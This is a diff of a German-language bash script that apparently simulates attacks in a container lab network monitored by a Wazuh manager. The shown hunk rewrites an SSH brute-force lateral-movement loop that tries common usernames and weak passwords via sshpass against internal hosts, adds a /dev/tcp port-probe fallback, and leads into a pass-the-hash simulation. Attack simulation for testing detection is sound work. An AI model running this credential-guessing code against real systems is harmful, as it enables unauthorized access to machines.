@@ -47,18 +47,26 @@ sudo docker exec clab-dmz-project-sun-$START_NODE bash -c "
 echo "[*] SSH Lateral Movement Versuche..."
 TARGETS=("db-backend" "client-internal" "wazuh-manager")
 
-for target in "${TARGETS[@]}"; do
-    echo "[*] Versuche SSH zu $target..."
-    sudo docker exec clab-dmz-project-sun-$START_NODE bash -c "
-        # Versuche mit verschiedenen Credentials
-        for user in root admin user; do
-            for pass in password admin root 123456; do
-                sshpass -p \"\$pass\" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 \
-                    \$user@$target 'whoami' 2>/dev/null && echo '[!] Erfolg: \$user@$target' || true
+sudo docker exec clab-dmz-project-sun-$START_NODE bash -c "
+    if command -v sshpass &> /dev/null; then
+        for target in ${TARGETS[@]}; do
+            echo \"[*] Versuche SSH zu \$target...\"
+            for user in root admin user; do
+                for pass in password admin root 123456; do
+                    sshpass -p \"\$pass\" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 \
+                        \$user@\$target 'whoami' 2>/dev/null && echo '[!] Erfolg: \$user@\$target' || true
+                done
             done
         done
-    "
-done
+    else
+        echo \"[!] sshpass nicht gefunden. Überspringe SSH Brute Force Phase.\"
+        # Fallback: Einfacher Port Check mit Netcat oder Bash
+        for target in ${TARGETS[@]}; do
+            echo \"[*] Prüfe SSH Port auf \$target...\"
+            (echo > /dev/tcp/\$target/22) >/dev/null 2>&1 && echo \"[+] SSH Port offen auf \$target\" || echo \"[-] SSH Port geschlossen auf \$target\"
+        done
+    fi
+"
 
 # Pass-the-Hash Simulation
 echo "[*] Simuliere Pass-the-Hash Angriff..."
